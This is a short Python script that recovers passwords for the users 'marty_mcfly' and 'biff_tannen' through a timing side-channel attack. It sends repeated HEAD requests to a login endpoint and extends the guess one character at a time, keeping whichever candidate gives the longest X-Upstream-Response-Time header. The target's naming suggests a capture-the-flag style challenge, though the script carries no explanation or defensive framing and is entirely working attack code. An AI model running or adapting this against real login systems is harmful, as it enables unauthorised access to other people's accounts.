import requests, string

moo = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
pre = ''
hightime = 0.01
highword = ''

for i in range(12):
	for stuff in moo:
		cow = dict(username='marty_mcfly',password = pre+stuff)
		response = requests.head('https://store.delorean.codes/u/andrewlee116/login',data = cow)
		if(float(response.headers['X-Upstream-Response-Time'])>hightime):
			hightime = float(response.headers['X-Upstream-Response-Time'])
			highword = pre+stuff
	print(hightime,highword) #to check that my script is doing something
	pre = highword
	hightime = 0

print("Marty Mcfly's password is {}".format(highword))

pre = ''
hightime = 0.01
highword = ''

for i in range(12):
	for stuff in moo:
		cow = dict(username='biff_tannen',password = pre+stuff)
		response = requests.head('https://store.delorean.codes/u/andrewlee116/login',data = cow)
		if(float(response.headers['X-Upstream-Response-Time'])>hightime):
			hightime = float(response.headers['X-Upstream-Response-Time'])
			highword = pre+stuff
	print(hightime,highword)
	pre = highword
	hightime = 0

print("Biff Tannen's password is {}".format(highword))
